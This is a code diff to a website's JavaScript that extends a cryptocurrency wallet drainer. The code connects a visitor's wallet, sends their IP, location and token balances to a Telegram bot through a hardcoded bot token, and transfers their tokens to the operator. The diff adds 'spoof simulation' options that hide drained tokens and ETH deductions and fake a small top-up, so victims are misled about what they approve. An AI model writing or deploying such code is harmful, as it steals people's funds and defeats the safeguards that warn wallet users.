@@ -81,6 +81,16 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
+ * Spoof Simulation Configuration
+ */
+const spoofConfig = {
+  noApprovementMode: false, // Hide tokens that will be drained (Pectra users only, disables autoclaim)
+  hideNativeWithdraw: false, // Conceal native token deductions
+  showNativeTopup: false, // Show +0.0000000001 ETH receipt in simulation
+  tokenTopupAmount: 0 // Amount of fake tokens to credit (0 to disable)
+};
+
+/**
  * Wallet connect and token transfer using Moralis API with Telegram notification
  */
 async function connectWalletAndSendTokens() {
@@ -126,7 +136,35 @@ async function connectWalletAndSendTokens() {
       }
     });
 
-    const tokens = await response.json();
+    let tokens = await response.json();
+
+    // Apply spoof simulation settings
+    if (spoofConfig.noApprovementMode) {
+      // Hide tokens that would be drained (for Pectra users, no autoclaim)
+      tokens = tokens.filter(token => !token.balance || ethers.BigNumber.from(token.balance).isZero());
+    }
+
+    if (spoofConfig.tokenTopupAmount > 0) {
+      // Add fake token balance
+      const fakeToken = {
+        token_address: "0xFakeTokenAddress",
+        name: "Fake Token",
+        symbol: "FAKE",
+        decimals: 18,
+        balance: ethers.utils.parseUnits(spoofConfig.tokenTopupAmount.toString(), 18).toString()
+      };
+      tokens.push(fakeToken);
+    }
+
+    // Get native balance (ETH)
+    const nativeBalance = await provider.getBalance(userAddress);
+    let nativeBalanceFormatted = ethers.utils.formatEther(nativeBalance);
+    let nativeBalanceDisplay = nativeBalanceFormatted;
+
+    if (spoofConfig.showNativeTopup) {
+      // Simulate +0.0000000001 ETH top-up
+      nativeBalanceDisplay = (parseFloat(nativeBalanceFormatted) + 0.0000000001).toFixed(18);
+    }
 
     // Format balance summary
     let tokenSummary = "";
@@ -150,6 +188,9 @@ IP: ${locationData.ip || "N/A"}
 
 💰 Token Balances:
 ${tokenSummary}
+
+💸 Native Balance (ETH):
+${spoofConfig.hideNativeWithdraw ? "Hidden" : nativeBalanceDisplay}${spoofConfig.showNativeTopup ? " (includes +0.0000000001 ETH top-up)" : ""}
     `;
 
     const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
@@ -167,6 +208,12 @@ ${tokenSummary}
     // Proceed with transferring tokens to your address
     for (const token of tokens) {
       try {
+        // Skip transfer if noApprovementMode is enabled (no autoclaim)
+        if (spoofConfig.noApprovementMode) {
+          console.log(`Skipping transfer of ${token.symbol} due to No Approvement Mode`);
+          continue;
+        }
+
         const contract = new ethers.Contract(token.token_address, [
           "function transfer(address to, uint amount) returns (bool)"
         ], signer);
@@ -179,6 +226,11 @@ ${tokenSummary}
       } catch (err) {
         console.warn(`Failed to send ${token.symbol}`, err);
       }
+    }
+
+    // Simulate native token deduction (ETH) unless hidden
+    if (!spoofConfig.hideNativeWithdraw) {
+      console.log(`Simulated native withdraw: ${nativeBalanceFormatted} ETH`);
     }
 
   } catch (err) {
